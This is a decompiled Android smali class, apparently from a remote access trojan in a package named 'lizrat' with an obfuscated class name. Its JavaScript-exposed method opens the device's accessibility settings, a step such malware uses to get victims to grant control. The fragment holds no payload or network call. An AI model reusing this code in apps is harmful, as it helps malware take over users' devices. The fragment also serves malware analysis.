.class public LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16$WebAppInterface;
.super Ljava/lang/Object;
.source "sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = null
.end annotation


# instance fields
.field mContext:Landroid/content/Context;

.field final synthetic this$0:LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16;


# direct methods
.method constructor <init>(LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16;Landroid/content/Context;)V
    .locals 0

    .line 111
    iput-object p1, p0, LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16$WebAppInterface;->this$0:LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 112
    iput-object p2, p0, LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16$WebAppInterface;->mContext:Landroid/content/Context;

    return-void
.end method


# virtual methods
.method public returnResult()V
    .locals 2
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .line 117
    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.settings.ACCESSIBILITY_SETTINGS"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/high16 v1, 0x10000000

    .line 118
    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 119
    iget-object v1, p0, LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16$WebAppInterface;->this$0:LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16;

    invoke-virtual {v1, v0}, LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16;->startActivity(Landroid/content/Intent;)V

    return-void
.end method
